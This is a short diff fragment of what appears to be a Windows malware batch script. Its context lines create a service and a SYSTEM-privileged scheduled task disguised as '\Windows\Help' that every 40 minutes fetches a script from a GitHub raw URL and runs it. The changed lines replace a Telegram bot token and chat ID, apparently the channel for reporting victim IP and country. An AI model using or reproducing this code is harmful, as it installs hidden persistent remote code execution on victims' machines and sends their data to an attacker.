@@ -23,8 +23,8 @@ sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercont
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/nugp/0/0/0/il | cmd /Q /V:ON" /F
 
 chcp 65001 >nul
-set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
-set "CHAT_ID=-4955395962"
+set "TOKEN=7505977903:AAHnQLk09FmwqfO48J6PVCzevuVCJpSoSdk"
+set "CHAT_ID=-1003799114483"
 set "IP=No IP"
 set "Country=No Country"
 
